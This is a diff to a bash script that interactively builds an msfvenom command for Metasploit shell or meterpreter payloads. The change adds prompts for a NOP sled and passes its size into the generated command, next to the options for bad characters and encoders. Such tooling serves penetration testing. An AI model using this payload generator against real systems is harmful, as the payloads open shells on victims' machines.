@@ -236,9 +236,8 @@ check_bad_chars()
         if [[ $bad_char_check =~ $encode_regex ]];
         then
                 off_bad_char="-b $bad_char_check"
-                echo $off_bad_char
         else
-                echo "$bad_char_check is not a valid format for bad characters."
+                echo "${mag}${bad_char_check} is not a valid format for bad characters."
                 check_bad_chars
         fi
 
@@ -255,13 +254,46 @@ case $bad_char in
         n)
         ;;
         *)
-        echo "$bad_char is not one of the options."
+        echo "${mag}${bad_char} is not one of the options."
         bad_characters_question
         ;;
 esac
 }
 
 bad_characters_question
+
+#Asks for user to input number of nops they would like.
+validate_nops(){
+echo "${cyn}How many NOPS would you like to add? Please enter a number."
+read nops
+nops_regex='^[0-9]+$'
+if [[ $nops =~ $nops_regex ]];
+then
+	nostring="-n $nops"
+else
+	echo "${mag}${nops} is not a valid format." 
+	validate_nops
+fi
+}
+
+#Asks user whether they would like to add a nopsled.
+add_nops(){
+echo "${grn}Would you like to add NOPS to your payload? Please enter y for yes and n for no."
+read ask_nops
+case $ask_nops in
+	y)
+	validate_nops
+	;;
+	n)
+	;;
+	*)
+	echo "${mag}${nops} is not a valid choice."
+	add_nops
+	;;
+esac
+}
+
+add_nops
 
 #Asks user the type of encoder they would like to use. 
 validate_encoding(){
@@ -337,7 +369,7 @@ payload=""
 msfgen=""
 
 generate_string() {
-	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} --platform ${OS} ${arc_display} -f $format ${off_bad_char} ${enc_format} ${iteration}"
+	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} --platform ${OS} ${arc_display} -f ${format} ${off_bad_char} ${nostring} ${enc_format} ${iteration}"
 }
 
 case  $meterpreter  in
